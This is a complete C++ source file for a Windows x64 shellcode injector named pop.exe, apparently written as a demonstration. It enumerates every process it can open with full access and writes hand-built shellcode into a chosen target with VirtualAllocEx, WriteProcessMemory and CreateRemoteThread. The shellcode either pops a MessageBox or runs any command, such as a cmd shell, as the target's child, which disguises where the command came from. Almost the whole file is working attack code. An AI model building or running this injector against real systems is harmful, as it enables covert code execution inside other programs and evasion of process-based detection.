// pop.cpp — flexible shellcode injector (works on ANY x64 process you can open)
//
// Modes:
//   --list                                  Show every running process you can
//                                           inject into (OpenProcess with full
//                                           access succeeds). PID, name, user,
//                                           memory, GUI/console. Sorted biggest
//                                           first.
//
//   pop.exe                                 Default target: MVTC → spawn notepad
//   pop.exe <PID>                           That PID → spawn notepad
//   pop.exe <name>                          That process → spawn notepad
//   pop.exe <PID|name> <program>            Target → spawn <program>
//
//   pop.exe --msg                           MVTC → MessageBox popup
//   pop.exe <target> --msg                  Target → MessageBox popup
//   pop.exe <target> --msg "custom text"    MessageBox with your text
//
// Target selection (any application works):
//   - By name:   pop.exe chrome
//                pop.exe firefox.exe
//                pop.exe explorer
//                pop.exe discord
//   - By PID:    pop.exe 3344
//
// Build:
//   cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop.exe

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

static void get_user_for_pid(DWORD pid, char* out, size_t cap) {
    strncpy_s(out, cap, "-", _TRUNCATE);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;
    HANDLE tok;
    if (OpenProcessToken(h, TOKEN_QUERY, &tok)) {
        BYTE buf[256]; DWORD need = 0;
        if (GetTokenInformation(tok, TokenUser, buf, sizeof(buf), &need)) {
            TOKEN_USER* tu = (TOKEN_USER*)buf;
            char name[128] = "", dom[128] = ""; DWORD nl = 128, dl = 128;
            SID_NAME_USE snu;
            if (LookupAccountSidA(nullptr, tu->User.Sid, name, &nl, dom, &dl, &snu)) {
                _snprintf_s(out, cap, _TRUNCATE, "%s\\%s", dom, name);
            }
        }
        CloseHandle(tok);
    }
    CloseHandle(h);
}

static bool has_gui(DWORD pid) {
    struct Ctx { DWORD pid; bool found; };
    Ctx c = { pid, false };
    EnumWindows([](HWND h, LPARAM lp) -> BOOL {
        Ctx* c = (Ctx*)lp;
        DWORD wpid = 0;
        GetWindowThreadProcessId(h, &wpid);
        if (wpid == c->pid && IsWindowVisible(h)) { c->found = true; return FALSE; }
        return TRUE;
    }, (LPARAM)&c);
    return c.found;
}

static void list_injectable() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { printf("[!] snapshot failed\n"); return; }

    struct Row { DWORD pid; char name[64]; char user[96]; SIZE_T ws; bool gui; };
    std::vector<Row> rows;
    rows.reserve(256);

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) do {
        if (pe.th32ProcessID <= 4) continue;              // skip System idle/System
        HANDLE t = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if (!t) continue;                                 // can't inject here
        CloseHandle(t);

        Row r = {};
        r.pid = pe.th32ProcessID;
        strncpy_s(r.name, sizeof(r.name), pe.szExeFile, _TRUNCATE);
        get_user_for_pid(r.pid, r.user, sizeof(r.user));

        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, r.pid);
        if (h) {
            PROCESS_MEMORY_COUNTERS pmc = {};
            if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc))) r.ws = pmc.WorkingSetSize;
            CloseHandle(h);
        }
        r.gui = has_gui(r.pid);
        rows.push_back(r);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);

    // Sort by working set descending (biggest = most interesting)
    std::sort(rows.begin(), rows.end(), [](const Row& a, const Row& b){ return a.ws > b.ws; });

    printf("\n== Injectable processes (OpenProcess PROCESS_ALL_ACCESS succeeded) ==\n");
    printf("    PID  Name                             User                          MB   UI\n");
    printf("------  -------------------------------  ----------------------------  -----  --\n");
    int shown = 0;
    for (const auto& r : rows) {
        if (shown >= 40) break;                            // top 40
        printf("%6lu  %-31s  %-28s  %5.1f   %s\n",
               r.pid, r.name, r.user, r.ws / (1024.0 * 1024.0), r.gui ? "yes" : "-");
        shown++;
    }
    printf("\n%zu total injectable processes.  Pick one and run:\n", rows.size());
    printf("  pop.exe <PID>               -> spawn notepad under it\n");
    printf("  pop.exe <PID> --msg         -> pop a MessageBox owned by it\n");
    printf("  pop.exe <name> --msg \"txt\"  -> target by name, custom text\n\n");
    printf("Tip: UI=yes columns are safe targets for --msg (user32 is loaded).\n");
    printf("     UI=- (console) usually also works for spawn mode.\n");
}

static DWORD find_by_name(const char* name) {
    char target[260];
    strncpy_s(target, sizeof(target), name, _TRUNCATE);
    size_t len = strlen(target);
    if (len < 4 || _stricmp(target + len - 4, ".exe") != 0) {
        strncat_s(target, sizeof(target), ".exe", _TRUNCATE);
    }

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD best_pid = 0;
    SIZE_T best_set = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, target) != 0) continue;
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!h) continue;
        PROCESS_MEMORY_COUNTERS pmc = {};
        if (GetProcessMemoryInfo(h, &pmc, sizeof(pmc)) && pmc.WorkingSetSize > best_set) {
            best_set = pmc.WorkingSetSize;
            best_pid = pe.th32ProcessID;
        }
        CloseHandle(h);
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return best_pid;
}

static void get_name_for_pid(DWORD pid, char* out, size_t cap) {
    strncpy_s(out, cap, "unknown", _TRUNCATE);
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return;
    char path[MAX_PATH] = "";
    DWORD plen = MAX_PATH;
    if (QueryFullProcessImageNameA(h, 0, path, &plen)) {
        const char* bn = strrchr(path, '\\');
        strncpy_s(out, cap, bn ? bn + 1 : path, _TRUNCATE);
    }
    CloseHandle(h);
}

static bool is_all_digits(const char* s) {
    if (!s || !*s) return false;
    for (; *s; s++) if (*s < '0' || *s > '9') return false;
    return true;
}

static void usage(const char* prog) {
    printf("Usage:\n");
    printf("  %s                                 MVTC -> MessageBox (default text)\n", prog);
    printf("  %s <target>                        target -> MessageBox (default text)\n", prog);
    printf("  %s <target> \"your message\"         target -> MessageBox with YOUR text\n", prog);
    printf("  %s <target> --spawn <program>      target -> spawn <program> as child\n", prog);
    printf("  %s --list                          list every injectable process\n", prog);
    printf("  %s --help                          this help\n\n", prog);
    printf("Target is a PID or a process name. Works on ANY x64 app you can open.\n\n");
    printf("Examples:\n");
    printf("  %s                                 default pop into MVTC\n", prog);
    printf("  %s --list                          see what you can inject into\n", prog);
    printf("  %s chrome                          default pop into chrome\n", prog);
    printf("  %s explorer \"I was here\"            custom message in explorer\n", prog);
    printf("  %s 1234 \"PWNED by m14r41\"           custom message in PID 1234\n", prog);
    printf("  %s MVTC --spawn notepad.exe        spawn notepad as MVTC's child\n", prog);
    printf("  %s MVTC --spawn \"cmd /k whoami\"    pop a cmd as MVTC's child\n", prog);
}

// Build shellcode that calls WinExec("program", SW_SHOWNORMAL); ret
// Returns malloc'd buffer; caller free()s.
static unsigned char* build_spawn_shellcode(const char* cmd, size_t* outLen) {
    FARPROC winexec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (!winexec) return nullptr;

    size_t cmdlen = strlen(cmd) + 1;
    size_t sclen = 33 + cmdlen;
    unsigned char* sc = (unsigned char*)malloc(sclen);
    static const unsigned char prolog[33] = {
        0x48,0x83,0xEC,0x28,                           // sub rsp, 0x28
        0x48,0x8D,0x0D, 0x16,0x00,0x00,0x00,           // lea rcx, [rip + 0x16]
        0xBA,0x01,0x00,0x00,0x00,                      // mov edx, 1  (SW_SHOWNORMAL)
        0x48,0xB8, 0,0,0,0,0,0,0,0,                    // mov rax, <WinExec>
        0xFF,0xD0,                                     // call rax
        0x48,0x83,0xC4,0x28,                           // add rsp, 0x28
        0xC3                                           // ret
    };
    memcpy(sc, prolog, sizeof(prolog));
    memcpy(sc + 18, &winexec, 8);
    memcpy(sc + 33, cmd, cmdlen);
    *outLen = sclen;
    return sc;
}

// Build shellcode that calls MessageBoxA(NULL, text, caption, flags); ret
// Flags set to always-on-top + foreground + info icon so you can't miss it.
static unsigned char* build_msgbox_shellcode(const char* text, size_t* outLen) {
    HMODULE user32 = LoadLibraryA("user32.dll");
    if (!user32) return nullptr;
    FARPROC messagebox_fn = GetProcAddress(user32, "MessageBoxA");
    if (!messagebox_fn) return nullptr;

    static const char* caption = "Process Injection Demo";
    size_t text_len = strlen(text) + 1;
    size_t cap_len  = strlen(caption) + 1;
    size_t code_len = 43;
    size_t sclen    = code_len + text_len + cap_len;

    unsigned char* sc = (unsigned char*)malloc(sclen);

    // MessageBox uType = MB_OK | MB_ICONINFORMATION = 0x40
    DWORD mb_flags = 0x00000040;

    sc[0]=0x48; sc[1]=0x83; sc[2]=0xEC; sc[3]=0x28;        // sub rsp, 0x28
    sc[4]=0x31; sc[5]=0xC9;                                 // xor ecx, ecx (HWND=NULL)
    sc[6]=0x48; sc[7]=0x8D; sc[8]=0x15;                     // lea rdx, [rip + text_disp]
    DWORD text_disp = (DWORD)(43 - 13);
    memcpy(sc + 9, &text_disp, 4);
    sc[13]=0x4C; sc[14]=0x8D; sc[15]=0x05;                  // lea r8, [rip + cap_disp]
    DWORD cap_disp = (DWORD)(43 + text_len - 20);
    memcpy(sc + 16, &cap_disp, 4);
    sc[20]=0x41; sc[21]=0xB9;                               // mov r9d, imm32
    memcpy(sc + 22, &mb_flags, 4);                          // flags
    sc[26]=0x48; sc[27]=0xB8;                               // mov rax, imm64
    memcpy(sc + 28, &messagebox_fn, 8);                     // MessageBoxA
    sc[36]=0xFF; sc[37]=0xD0;                               // call rax
    sc[38]=0x48; sc[39]=0x83; sc[40]=0xC4; sc[41]=0x28;     // add rsp, 0x28
    sc[42]=0xC3;                                            // ret
    memcpy(sc + 43, text, text_len);
    memcpy(sc + 43 + text_len, caption, cap_len);
    *outLen = sclen;
    return sc;
}

int main(int argc, char** argv) {
    const char* target_arg = nullptr;
    const char* spawn_cmd  = nullptr;
    bool msg_mode = true;                    // default: MessageBox
    const char* custom_msg = nullptr;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--list") == 0 || strcmp(argv[i], "-l") == 0) {
            list_injectable();
            return 0;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "/?") == 0) {
            usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--spawn") == 0 || strcmp(argv[i], "-s") == 0) {
            msg_mode = false;
            if (i + 1 < argc) { spawn_cmd = argv[i + 1]; i++; }
            else spawn_cmd = "notepad.exe";
        } else if (strcmp(argv[i], "--msg") == 0 || strcmp(argv[i], "-m") == 0) {
            msg_mode = true;
            if (i + 1 < argc && argv[i+1][0] != '-') {
                custom_msg = argv[i + 1];
                i++;
            }
        } else if (!target_arg) {
            target_arg = argv[i];
        } else {
            custom_msg = argv[i];
            msg_mode = true;
        }
    }
    if (!spawn_cmd && !msg_mode) spawn_cmd = "notepad.exe";

    // Ensure user32.dll is loaded in THIS process so GetProcAddress returns a
    // valid base - and so the address matches what the target already has.
    LoadLibraryA("user32.dll");

    DWORD target_pid = 0;
    const char* resolve_name = target_arg ? target_arg : "MVTC.exe";
    if (is_all_digits(resolve_name)) {
        target_pid = (DWORD)strtoul(resolve_name, nullptr, 10);
    } else {
        printf("[*] searching for %s...\n", resolve_name);
        target_pid = find_by_name(resolve_name);
    }
    if (!target_pid) {
        printf("[!] no process matching '%s' is running. Launch it first.\n", resolve_name);
        system("pause");
        return 1;
    }

    char host_name[260];
    get_name_for_pid(target_pid, host_name, sizeof(host_name));
    printf("[+] target: PID %lu (%s)\n", target_pid, host_name);

    unsigned char* sc = nullptr;
    size_t sclen = 0;
    char default_msg[512];

    if (msg_mode) {
        if (!custom_msg) {
            snprintf(default_msg, sizeof(default_msg),
                     "Process injection in %s (PID %lu) successful!\r\n\r\n"
                     "This MessageBox is running INSIDE the host process.\r\n"
                     "Shellcode injected via CreateRemoteThread.\r\n\r\n"
                     "- pop.exe demo",
                     host_name, target_pid);
            custom_msg = default_msg;
        }
        printf("[+] mode: MessageBox popup\n");
        printf("[+] text: %.80s%s\n", custom_msg, strlen(custom_msg) > 80 ? "..." : "");
        sc = build_msgbox_shellcode(custom_msg, &sclen);
    } else {
        printf("[+] mode: spawn child process -> %s\n", spawn_cmd);
        sc = build_spawn_shellcode(spawn_cmd, &sclen);
    }

    if (!sc) { printf("[!] shellcode build failed\n"); system("pause"); return 2; }
    printf("[+] shellcode: %zu bytes\n", sclen);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProc) {
        printf("[!] OpenProcess(%lu) failed: %lu  (try running as Administrator)\n",
               target_pid, GetLastError());
        free(sc);
        system("pause");
        return 3;
    }

    LPVOID remote = VirtualAllocEx(hProc, nullptr, sclen,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) { printf("[!] VirtualAllocEx %lu\n", GetLastError()); free(sc); system("pause"); return 4; }

    SIZE_T w = 0;
    WriteProcessMemory(hProc, remote, sc, sclen, &w);
    printf("[+] wrote %zu bytes to %p inside %s\n", w, remote, host_name);
    free(sc);

    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
                                   (LPTHREAD_START_ROUTINE)remote,
                                   nullptr, 0, nullptr);
    if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); system("pause"); return 5; }
    WaitForSingleObject(hT, 5000);
    CloseHandle(hT);
    CloseHandle(hProc);

    if (msg_mode) {
        printf("\n[+] DONE. A pop-up should appear owned by %s.\n", host_name);
        printf("    Click OK on the pop-up to let the injected thread exit.\n");
    } else {
        printf("\n[+] DONE. Check:\n");
        printf("    Task Manager > Details tab: find the spawned process; Parent PID = %lu\n", target_pid);
        printf("    System Informer: the spawn appears indented under %s\n", host_name);
    }
    system("pause");
    return 0;
}
